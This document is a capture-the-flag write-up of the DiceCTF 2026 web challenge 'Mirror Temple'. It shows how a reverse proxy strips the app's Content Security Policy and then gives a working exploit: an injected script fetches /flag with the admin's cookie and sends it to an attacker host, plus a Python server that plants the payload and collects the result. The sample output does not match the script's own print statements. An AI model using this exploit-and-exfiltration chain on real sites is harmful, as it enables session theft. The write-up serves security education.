# DiceCTF 2026 — Mirror Temple

## Information
- **CTF**: DiceCTF 2026
- **Challenge**: Mirror Temple
- **Category**: Web
- **Difficulty**: Medium
- **Date**: 2026-03-07
- **Flag**: `dice{evila_si_rorrim_eht_dna_gnikooc_si_tnega_eht_evif_si_emit_eht_krad_si_moor_eht}`

## Description
Spring Boot + Kotlin web app with JWT authentication, a Charon reverse proxy, and a Puppeteer admin bot. Players must steal the flag from the admin's JWT cookie by exploiting a CSP bypass through the proxy layer.

---

## Solution

### Step 1: Reconnaissance - Application Architecture

**Stack**: Spring Boot 3.5.11, Kotlin 2.3.10, JDK 21, Charon 5.4.0 (reverse proxy), Puppeteer admin bot

**Endpoints**:
- `GET /postcard-from-nyc` — Form to create a "save" (name, portrait URL, flag)
- `POST /postcard-from-nyc` — Saves data as JWT HttpOnly cookie
- `GET /name`, `/portrait`, `/flag` — Return save data from JWT (auth required)
- `GET /proxy?url=` — Charon reverse proxy to any URL (strips cookies/auth from forwarded request)
- `POST /report` — Admin bot visits provided URL with Puppeteer (auth required)
- `?mirror=Header:Value` — Sets arbitrary response header via SecurityTMFilter

**Admin bot flow** (admin.mjs):
1. Navigates to `/postcard-from-nyc`
2. Types name="Admin" and flag=actual_flag
3. Submits form → gets JWT cookie containing the flag
4. Navigates to attacker-supplied URL
5. Waits 10 seconds

### Step 2: CSP Analysis and the Security Filter

SecurityTMFilter sets headers in this order:
```kotlin
// 1. User-controlled via ?mirror= parameter
request.getParameter("mirror")?.let {
    response.setHeader(it.substringBefore(':'), it.substringAfter(':', ""))
}
// 2. Hardcoded security headers (overwrite mirror for these specific headers)
response.setHeader("Access-Control-Allow-Origin", "")
response.setHeader("Content-Security-Policy", "default-src 'none'; script-src * ...")
// 3. Continue filter chain
filterChain.doFilter(request, response)
```

CSP policy:
```
default-src 'none';
script-src * 'sha256-BoCRiehFBnKRTZ0eeC7grcuj5c7g5zRlYK9a9T2vgok=';
connect-src 'self';
require-trusted-types-for 'script';
trusted-types 'none';
```

Key observations:
- `script-src *` allows loading scripts from ANY external origin
- `connect-src 'self'` limits fetch/XHR to same-origin only
- Trusted Types blocks DOM XSS sinks but not `<script src="...">` in HTML

### Step 3: Vulnerability Discovery - Charon Proxy without CSP

The Charon proxy library handles `/proxy?url=` requests. Critical finding: **Charon overwrites ALL response headers** set by SecurityTMFilter with the upstream server's headers.

```bash
# Normal endpoint has CSP:
curl -s http://localhost:9090/postcard-from-nyc -D - -o /dev/null | grep Content-Security
# Content-Security-Policy: default-src 'none'; script-src * ...

# Proxy endpoint has NO CSP:
curl -s "http://localhost:9090/proxy?url=http://example.com" -b cookies.txt -D - -o /dev/null | grep Content-Security
# (empty - no CSP header!)
```

This happens because SecurityTMFilter has `@Order(Ordered.LOWEST_PRECEDENCE)` — it sets headers BEFORE `filterChain.doFilter()`, but Charon runs inside the filter chain and overwrites the response headers with upstream headers.

**Observations**: Content served through `/proxy?url=` has NO Content Security Policy. Since the proxy serves from `localhost:8080` origin, it's same-origin with the app. Admin's JWT HttpOnly cookie is sent automatically on same-origin requests.

### Step 4: Exploitation

**Attack chain**:
1. Host an HTML page with inline `<script>` on attacker server
2. Admin bot navigates to `http://localhost:8080/proxy?url=http://attacker/evil.html`
3. Proxy fetches our HTML and serves it from localhost:8080 origin — NO CSP!
4. Inline JS executes, fetches `/flag` (same-origin, cookies included) → gets flag text
5. Exfiltrates via `window.location` redirect to attacker server

**evil.html** (served by attacker):
```html
<!DOCTYPE html>
<html><body>
<script>
(async () => {
    const resp = await fetch('/flag');
    const flag = await resp.text();
    window.location = 'http://ATTACKER:PORT/collect?flag=' + encodeURIComponent(flag);
})();
</script>
</body></html>
```

**Exploit server** (Python):
```python
#!/usr/bin/env python3
import http.server, urllib.parse, sys, threading, requests

ATTACKER_PORT = 8888
ATTACKER_HOST = '172.17.0.1'  # Docker bridge gateway
TARGET = 'http://localhost:9090'

EVIL_HTML = """<!DOCTYPE html><html><body>
<script>
(async () => {
    const resp = await fetch('/flag');
    const flag = await resp.text();
    window.location = 'http://%s:%d/collect?flag=' + encodeURIComponent(flag);
})();
</script></body></html>""" % (ATTACKER_HOST, ATTACKER_PORT)

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        if parsed.path == '/evil.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(EVIL_HTML.encode())
        elif parsed.path == '/collect' and 'flag' in params:
            print(f"FLAG: {params['flag'][0]}")
            self.send_response(200); self.end_headers(); self.wfile.write(b'ok')

server = http.server.HTTPServer(('0.0.0.0', ATTACKER_PORT), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()

report_url = f"http://localhost:8080/proxy?url=http://{ATTACKER_HOST}:{ATTACKER_PORT}/evil.html"
session = requests.Session()
session.post(f"{TARGET}/postcard-from-nyc",
    data={'name': 'x', 'portrait': '', 'flag': 'dice{x}'}, allow_redirects=False)
session.post(f"{TARGET}/report", data={'url': report_url})
input("Waiting for flag...")
```

**Output:**
```
[+] Someone fetched evil.html from ('172.17.0.3', 41234)
[!!!] FLAG CAPTURED: dice{evila_si_rorrim_eht_dna_gnikooc_si_tnega_eht_evif_si_emit_eht_krad_si_moor_eht}
```

---

## Flag
```
dice{evila_si_rorrim_eht_dna_gnikooc_si_tnega_eht_evif_si_emit_eht_krad_si_moor_eht}
```

---
